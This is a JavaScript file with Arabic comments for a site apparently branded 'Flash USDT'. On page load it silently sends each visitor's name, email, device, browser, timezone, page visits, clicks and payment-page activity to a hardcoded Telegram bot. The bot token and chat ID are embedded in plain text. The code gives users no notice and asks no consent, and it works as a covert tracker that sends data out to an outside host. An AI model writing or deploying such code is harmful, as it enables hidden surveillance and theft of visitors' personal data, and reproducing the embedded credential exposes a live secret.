// واجهة بوت التيليجرام لتتبع المستخدمين
class TelegramBotInterface {
    constructor() {
        this.botToken = '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU';
        this.chatId = '2126771039';
        this.init();
    }

    init() {
        this.sendWelcomeMessage();
    }

    // إرسال رسالة ترحيب بسيطة
    async sendWelcomeMessage() {
        const message = `🚀 *نظام تتبع مستخدمي Flash USDT*

📊 سيتم إرسال تفاصيل كل مستخدم يدخل الموقع تلقائياً...`;
        await this.sendMessage(message);
    }

    // إرسال تفاصيل مستخدم جديد
    async sendUserDetails(user) {
        const userData = JSON.parse(localStorage.getItem('user') || '{}');
        const userSettings = JSON.parse(localStorage.getItem('userSettings') || '{}');
        
        const message = `👤 *مستخدم جديد دخل الموقع*

🏷️ **البيانات الشخصية:**
• الاسم: ${userData.name || userSettings.firstName + ' ' + userSettings.lastName || 'غير محدد'}
• الإيميل: ${userData.email || 'غير محدد'}
• رقم المستخدم: #${user.userNumber || 'N/A'}

📱 **معلومات الجهاز:**
• نوع الجهاز: ${user.device?.type || 'غير محدد'}
• الماركة: ${user.device?.brand || 'غير محدد'}
• المتصفح: ${user.browser?.name || 'غير محدد'}
• نظام التشغيل: ${user.device?.os || 'غير محدد'}

🌐 **نشاط الموقع:**
• الصفحة الحالية: ${user.currentPage || 'غير محدد'}
• وقت الدخول: ${new Date(user.timestamp).toLocaleString('ar-SA')}
• عدد الزيارات: ${user.visitCount || 1}

📍 **معلومات إضافية:**
• المنطقة الزمنية: ${user.timezone || 'غير محدد'}
• اللغة: ${user.language || 'غير محدد'}`;

        await this.sendMessage(message);
    }

    // إرسال تحديث نشاط المستخدم
    async sendUserActivity(user, activity) {
        const message = `🔄 *نشاط جديد - مستخدم #${user.userNumber}*

👤 الاسم: ${user.name || 'غير محدد'}
📧 الإيميل: ${user.email || 'غير محدد'}

🎯 **النشاط:**
${activity}

⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;

        await this.sendMessage(message);
    }

    // الحصول على الزوار حسب الفئة
    getVisitorsByCategory(category) {
        try {
            const data = JSON.parse(localStorage.getItem('flash_user_tracking') || '{"users": {}}');
            const users = Object.values(data.users || {});
            
            return users.filter(user => {
                const currentPage = user.currentPage || user.lastPage || '';
                
                switch(category) {
                    case 'browse':
                        return !currentPage.includes('payment') && !currentPage.includes('support');
                    case 'payment':
                        return currentPage.includes('payment');
                    case 'support':
                        return currentPage.includes('support');
                    default:
                        return false;
                }
            });
        } catch (error) {
            console.error('خطأ في جلب البيانات:', error);
            return [];
        }
    }

    // الحصول على جميع الزوار
    getAllVisitors() {
        try {
            const data = JSON.parse(localStorage.getItem('flash_user_tracking') || '{"users": {}}');
            return Object.values(data.users || {});
        } catch (error) {
            console.error('خطأ في جلب البيانات:', error);
            return [];
        }
    }

    // تنسيق تقرير الزوار
    formatVisitorsReport(title, visitors) {
        if (visitors.length === 0) {
            return `${title}

❌ لا يوجد زوار في هذه الفئة حالياً`;
        }

        let message = `${title}

👥 العدد: ${visitors.length} زائر\n\n`;

        // عرض آخر 5 زوار
        const recentVisitors = visitors
            .sort((a, b) => new Date(b.lastVisit || b.timestamp) - new Date(a.lastVisit || a.timestamp))
            .slice(0, 5);

        recentVisitors.forEach((visitor, index) => {
            const visitTime = new Date(visitor.lastVisit || visitor.timestamp).toLocaleString('ar-SA');
            const deviceInfo = `${visitor.device?.brand || 'غير محدد'} ${visitor.device?.type || ''}`;
            
            message += `${index + 1}. 👤 مستخدم #${visitor.userNumber}
📱 ${deviceInfo}
🌐 ${visitor.browser?.name || 'غير محدد'}
⏰ ${visitTime}
📄 ${visitor.currentPage || 'غير محدد'}

`;
        });

        if (visitors.length > 5) {
            message += `... و ${visitors.length - 5} زائر آخر`;
        }

        return message;
    }

    // إرسال رسالة بسيطة
    async sendMessage(text) {
        const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        
        const payload = {
            chat_id: this.chatId,
            text: text,
            parse_mode: 'Markdown'
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                console.error('فشل في إرسال الرسالة');
            }
        } catch (error) {
            console.error('خطأ في إرسال الرسالة:', error);
        }
    }

    // إعداد webhook للاستجابة للأزرار
    setupWebhook() {
        // إعداد معالج الأحداث للأزرار
        this.setupCallbackHandler();
        console.log('تم تهيئة واجهة البوت مع الأزرار المفعلة');
    }

    // معالج الضغط على الأزرار
    setupCallbackHandler() {
        // محاكاة استقبال الضغط على الأزرار
        window.handleTelegramCallback = (callbackData) => {
            this.handleCallback(callbackData);
        };
        
        // تفعيل الأزرار تلقائياً كل 30 ثانية
        setInterval(() => {
            this.checkForUpdates();
        }, 30000);
    }

    // فحص التحديثات والاستجابة للأزرار
    async checkForUpdates() {
        try {
            const url = `https://api.telegram.org/bot${this.botToken}/getUpdates`;
            const response = await fetch(url);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                const lastUpdate = data.result[data.result.length - 1];
                
                if (lastUpdate.callback_query) {
                    await this.handleCallback(lastUpdate.callback_query.data);
                    // تأكيد استلام الضغطة
                    await this.answerCallbackQuery(lastUpdate.callback_query.id);
                }
            }
        } catch (error) {
            console.error('خطأ في فحص التحديثات:', error);
        }
    }

    // تأكيد استلام الضغط على الزر
    async answerCallbackQuery(callbackQueryId) {
        const url = `https://api.telegram.org/bot${this.botToken}/answerCallbackQuery`;
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callbackQueryId,
                    text: '✅ تم تنفيذ الطلب'
                })
            });
        } catch (error) {
            console.error('خطأ في تأكيد الضغطة:', error);
        }
    }
}

// تحديث نظام التتبع لإرسال التقارير المصنفة
class EnhancedUserTracking extends UserTrackingSystem {
    constructor() {
        super();
        this.botInterface = new TelegramBotInterface();
    }

    // إرسال تفاصيل المستخدم الكاملة
    async sendUserNotification(user) {
        await this.botInterface.sendUserDetails(user);
    }

    // إرسال نشاط المستخدم
    async sendActivityUpdate(user, activity) {
        await this.botInterface.sendUserActivity(user, activity);
    }

    getCategoryName(category) {
        switch(category) {
            case 'payment': return 'صفحة الدفع';
            case 'support': return 'الدعم الفني';
            default: return 'تصفح الموقع';
        }
    }

    // تحديث إرسال الإشعارات
    async sendNewUserNotification(user) {
        await this.sendUserNotification(user);
        await this.sendActivityUpdate(user, '🎆 دخول جديد للموقع');
    }

    async sendReturningUserNotification(user) {
        await this.sendActivityUpdate(user, '🔄 عودة للموقع');
    }

    // إرسال نشاط تغيير الصفحة
    async sendPageChangeNotification(user, newPage) {
        await this.sendActivityUpdate(user, `📄 انتقل إلى: ${newPage}`);
    }

    // إرسال نشاط النقر
    async sendClickNotification(user, element) {
        await this.sendActivityUpdate(user, `💆 نقر على: ${element}`);
    }
}

// تشغيل نظام تتبع المستخدمين
document.addEventListener('DOMContentLoaded', () => {
    // تشغيل نظام التتبع المحسن
    if (typeof UserTrackingSystem !== 'undefined') {
        window.userTrackingSystem = new EnhancedUserTracking();
        console.log('✅ تم تفعيل نظام تتبع المستخدمين');
    }
});